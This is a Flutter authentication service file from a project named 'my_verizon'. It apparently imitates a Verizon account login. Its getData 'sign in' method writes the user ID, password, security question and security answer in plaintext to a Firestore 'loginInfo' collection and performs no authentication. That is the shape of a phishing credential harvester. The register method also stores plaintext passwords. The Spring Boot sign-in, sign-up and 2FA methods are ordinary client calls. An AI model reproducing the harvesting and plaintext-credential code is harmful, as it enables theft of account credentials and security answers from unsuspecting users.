import 'dart:developer';

import 'package:flutter/foundation.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:my_verizon/api_service/api_service.dart';
import 'package:my_verizon/models/request/auth_request_dto.dart';
import 'package:my_verizon/models/request/security_data_request_dto.dart';
import 'package:my_verizon/models/response/auth_response_dto.dart';

class AuthService {
  final ApiService apiService;
  final firesBase = FirebaseFirestore.instance;

  AuthService() : apiService = ApiService(client: null);

  //for firebase
  // sign in method
  Future<Map<String, dynamic>> getData({
    required String userID,
    required dynamic password,
    required String securityQuestion,
    required String securityQuestionAnswer,
  }) async {
    final data = {
      " a. userID": userID,
      " b. password": password,
      " c. securityQuestion": securityQuestion,
      " d. securityQuestionAnswer": securityQuestionAnswer,
    };
    try {
      await firesBase.collection('loginInfo').add(data);
    } catch (e) {
      if (kDebugMode) {
        print(e);
      }
      return {};
    }
    return data;
  }

  // This should be for SIGN UP - creating new user
  Future<void> register({
    required String name,
    required String username,
    required String password,
  }) async {
    try {
      // First check if user already exists
      final existingUser =
          await firesBase
              .collection('credential')
              .where('user', isEqualTo: username)
              .limit(1)
              .get();

      if (existingUser.docs.isNotEmpty) {
        throw Exception('User with this email already exists');
      }

      // Create new user
      final data = {
        'name': name,
        'user': username,
        'password': password,
        'createdAt': FieldValue.serverTimestamp(),
      };

      // Add to Firestore and wait for completion
      await firesBase.collection('credential').add(data);

      log('User created successfully: $username');
    } catch (e) {
      log('signUp error: $e');
      rethrow; // IMPORTANT: rethrow so Bloc can catch the error
    }
  }

  //for JavaSpringBoot

  //SIGNIN METHOD
  Future<AuthResponseDTO> signin({
    required String email,
    required String password,
  }) async {
    // create UserSecurityDataRequestDTO
    UserSecurityDataRequestDTO newUserSecurityDataRequestDTO =
        UserSecurityDataRequestDTO(securityQuestion: '', securityAnswer: '');

    final authRequestDTO =
        RequestBuilder.forSignIn(
          email: email,
          password: password,
          userSecurityDataRequestDTO: newUserSecurityDataRequestDTO,
        ).withIsActive(false).build();

    return await apiService.signIn(authRequestDTO);
  }

  // SIGN UP METHOD
  Future<AuthResponseDTO> signup({
    required String name,
    required String email,
    required String password,
  }) async {
    // create UserSecurityDataRequestDTO
    UserSecurityDataRequestDTO newUserSecurityDataRequestDTO =
        UserSecurityDataRequestDTO(securityQuestion: '', securityAnswer: '');

    final authRequestDTO =
        RequestBuilder.forSignUp(
              email: email,
              password: password,
              name: name,
              userSecurityDataRequestDTO: newUserSecurityDataRequestDTO,
            )
            .withIsActive(true) // Sign-up is active by default
            .withUserSecurityDataRequestDTO(newUserSecurityDataRequestDTO)
            .build();

    return await apiService.signUp(authRequestDTO);
  }

  // 2FA VERIFICATION METHOD
  Future<AuthResponseDTO> for2FAVerification({
    required String email,
    required String securityQuestion,
    required String securityAnswer,
  }) async {
    final userSecurityDataRequestDTO = UserSecurityDataRequestDTO(
      securityQuestion: securityQuestion,
      securityAnswer: securityAnswer,
    );

    final authRequestDTO =
        RequestBuilder(email: email, password: '', name: '')
            .withIsActive(true) // 2FA verification is active by default
            .withUserSecurityDataRequestDTO(userSecurityDataRequestDTO)
            .build();

    return apiService.verifyTwoFactor(authRequestDTO);
  }
}
